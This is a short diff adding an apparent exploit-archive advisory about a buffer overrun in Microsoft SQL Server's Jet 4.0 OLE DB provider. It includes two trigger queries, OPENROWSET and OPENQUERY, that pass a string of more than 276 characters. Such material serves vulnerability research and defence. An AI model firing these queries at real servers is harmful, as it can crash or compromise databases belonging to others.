@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/7541/info
+
+Microsoft SQL Server is prone to an exploitable buffer overrun vulnerability via the Jet Database Engine. This can occur while the JET 4.0 OLE DB data provider is querying data supplied via a remote source and is due to insufficient bounds checking of parameters of heterogeneous or ad hoc query methods.
+
+select * from openrowset('microsoft.jet.oledb.4.0','c:\anydatabase.mdb';'admin';'','select XXX...()')
+
+or
+
+select * from Openquery(SomeJet40LinkedServer,'Select XXX...()')
+
+
+(where XXX... is more than 276 chars)
